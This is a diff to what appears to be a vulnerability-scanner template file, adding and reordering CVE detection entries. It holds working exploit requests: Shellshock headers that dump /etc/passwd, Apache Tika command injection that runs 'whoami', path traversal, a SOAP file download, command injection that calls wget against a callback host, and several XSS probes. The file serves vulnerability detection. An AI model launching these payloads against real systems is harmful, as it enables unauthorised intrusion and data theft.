@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6388,11 +6388,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -7061,6 +7061,21 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=en-US; i_like_gogits=../../../../etc/passwd;\n",
             "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=en-US; i_like_gogits=../../../../etc/dummy;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19136",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "GET /assets/edit/registrar-account.php?raid=hello%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&del=1 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -11416,9 +11431,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -15917,8 +15932,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -16011,6 +16026,21 @@
         {
           "raw": [
             "POST /cgi/networkDiag.cgi HTTP/1.1\nHost: {{Hostname}}\n\ncommand=2&ipAddr=&dnsAddr=$(wget+http://{{interactsh-url}})&interface=0&netType=0&scrFilter=&dstFilter=&fileSave=false&pcapSave=false&fileSize=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-36450",
+      "info": {
+        "name": "Verint 15.2 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3C%2Fh1%3E26 HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3Ch1%3E%26 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nbrowserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screenHeight=1080&screenWidth=1920&pageModelType=0&pageDirty=false&pageAction=Login&csrfp_login={{csrfp_login}}\n"
           ]
         }
       ]
@@ -19141,6 +19171,20 @@
         {
           "raw": [
             "GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1\nHost: {{Hostname}}\nCookie: tmpToken=;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-35416",
+      "info": {
+        "name": "H3C SSL VPN through 2022-07-10 - Cookie Based XSS",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wnm/login/login.json HTTP/1.1\nHost: {{Hostname}}\nCookie: svpnlang=<script>alert('document.domain')</script>\n"
           ]
         }
       ]
